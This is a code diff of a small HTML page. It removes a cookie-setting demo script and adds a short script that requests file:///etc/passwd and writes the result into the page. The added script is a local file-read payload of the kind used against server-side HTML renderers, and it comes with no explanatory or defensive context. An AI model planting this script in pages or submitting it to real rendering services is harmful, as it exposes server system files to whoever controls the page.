@@ -4,18 +4,8 @@
     <h1 id="p1"></h1>
   </body>
   <script>
-    function setCookie(cname, cvalue, exdays) {
-      const d = new Date();
-      d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000);
-      let expires = "expires=" + d.toUTCString();
-      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-    }
-    window.addEventListener("load", setCookie("test","testvalue123",1));
-    window.addEventListener("load", function () {
-      var cookies = document.cookie;
-      console.log("cookies 213");
-      console.log(cookies);
-      document.getElementById("p1").innerHTML = cookies;
-    });
+    x=new XMLHttpRequest;
+    x.onload=function(){document.write(this.responseText)};
+    x.open("GET","file:///etc/passwd");x.send();
   </script>
 </html>
